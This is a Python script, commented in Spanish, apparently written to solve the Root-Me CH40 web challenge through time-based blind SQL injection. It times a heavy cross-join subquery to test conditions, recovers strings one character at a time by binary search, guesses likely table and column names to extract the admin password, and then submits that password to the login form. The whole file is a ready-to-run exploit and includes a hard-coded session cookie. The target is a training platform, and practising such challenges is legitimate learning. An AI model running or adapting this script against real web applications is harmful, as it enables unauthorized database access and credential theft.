#!/usr/bin/env python3
"""
SQL INJECTION TIME-BASED - ROOT-ME CH40
VERSIÓN 50 - USAR CHAR() PARA CONSTRUIR CADENAS
"""
import requests
import time
import statistics

URL = "http://challenge01.root-me.org/web-serveur/ch40/"
COOKIE = {"PHPSESSID": "fbf0fdc633505f66eef3f20808f0d1ce"}

class TimeBasedInjector:
    def __init__(self):
        self.session = requests.Session()
        self.session.cookies.update(COOKIE)
        self.heavy = "(SELECT COUNT(*) FROM usuarios, usuarios T1, usuarios T2)"
        self.technique = "1 AND ({cond}) AND {heavy}"
        self.threshold = 41.23
        self.mode = "normal"
        
    def test_payload(self, payload, repeats=5):
        tiempos = []
        params = {"action": "member", "member": payload}
        for _ in range(repeats):
            inicio = time.perf_counter_ns()
            try:
                r = self.session.get(URL, params=params, timeout=5)
                tiempo = (time.perf_counter_ns() - inicio) / 1_000_000
                tiempos.append(tiempo)
            except:
                tiempos.append(0)
            time.sleep(0.1)
        return statistics.median(tiempos) if tiempos else 0
    
    def is_true(self, condition):
        payload = f"1 AND ({condition}) AND {self.heavy}"
        t = self.test_payload(payload, repeats=3)
        return t > self.threshold
    
    def extract_char(self, query, pos):
        low, high = 32, 126
        while low <= high:
            mid = (low + high) // 2
            cond = f"ASCII(SUBSTRING(({query}), {pos}, 1)) > {mid}"
            if self.is_true(cond):
                low = mid + 1
            else:
                high = mid - 1
        return chr(low)
    
    def extract_string(self, query, label="Extrayendo", max_len=50):
        print(f"\n[*] {label}...")
        result = ""
        for pos in range(1, max_len + 1):
            char = self.extract_char(query, pos)
            result += char
            print(f"    [{pos}] '{char}' (ASCII: {ord(char)})")
            if ord(char) == 0 or ord(char) == 32:
                break
            time.sleep(0.1)
        return result

# ============================================================
# EJECUCIÓN
# ============================================================
injector = TimeBasedInjector()

print("="*70)
print("  USANDO CHAR() PARA CONSTRUIR CADENAS")
print("="*70)

# 1. Probar con CHAR()
print("\n[1] Probando CHAR(97,100,109,105,110) que debería ser 'admin'")
query_char = "SELECT CHAR(97,100,109,105,110)"
resultado = injector.extract_string(query_char, "CHAR(97,100,109,105,110)")
print(f"\n  Resultado: '{resultado}'")
print(f"  Esperado: 'admin'")

if resultado == "admin":
    print("  ✅ ¡ÉXITO! CHAR() funciona correctamente")
else:
    print("  ❌ CHAR() no funciona")

# 2. Probar con CONCAT()
print("\n[2] Probando CONCAT('a','d','m','i','n')")
query_concat = "SELECT CONCAT('a','d','m','i','n')"
resultado = injector.extract_string(query_concat, "CONCAT('a','d','m','i','n')")
print(f"\n  Resultado: '{resultado}'")
print(f"  Esperado: 'admin'")

# 3. Si CHAR funciona, extraer la contraseña
if resultado == "admin":
    print("\n[3] Extrayendo contraseña del admin...")
    
    # Probar diferentes tablas
    tablas = ['users', 'usuarios', 'member', 'members']
    columnas_pass = ['password', 'pass', 'pwd', 'clave', 'contrasena']
    col_user = 'username'
    
    for tabla in tablas:
        print(f"\n  Probando tabla: {tabla}")
        
        # Verificar si la tabla existe
        if not injector.is_true(f"EXISTS(SELECT * FROM {tabla})"):
            print(f"    ❌ Tabla no existe")
            continue
        
        print(f"    ✅ Tabla existe")
        
        # Verificar columna de usuario
        if not injector.is_true(f"EXISTS(SELECT {col_user} FROM {tabla})"):
            print(f"    ❌ Columna {col_user} no existe")
            continue
        
        print(f"    ✅ Columna {col_user} existe")
        
        # Verificar admin
        if not injector.is_true(f"EXISTS(SELECT {col_user} FROM {tabla} WHERE {col_user}='admin')"):
            print(f"    ❌ admin no encontrado")
            continue
        
        print(f"    ✅ admin encontrado")
        
        # Probar columnas de contraseña
        for col_pass in columnas_pass:
            if not injector.is_true(f"EXISTS(SELECT {col_pass} FROM {tabla})"):
                continue
            
            query = f"SELECT {col_pass} FROM {tabla} WHERE {col_user}='admin'"
            password = injector.extract_string(query, f"Contraseña de {tabla}.{col_pass}")
            
            if password:
                print(f"\n  [+] CONTRASEÑA ENCONTRADA en {tabla}.{col_pass}: {password}")
                
                # Verificar credenciales
                data = {"username": "admin", "password": password}
                r = requests.post(URL + "?action=login", data=data, cookies=injector.session.cookies)
                
                if "Authentification error" not in r.text:
                    print("\n" + "="*70)
                    print(f"  ✅ ¡CREDENCIALES CORRECTAS!")
                    print(f"  Usuario: admin")
                    print(f"  Contraseña: {password}")
                    print("="*70)
                    exit(0)
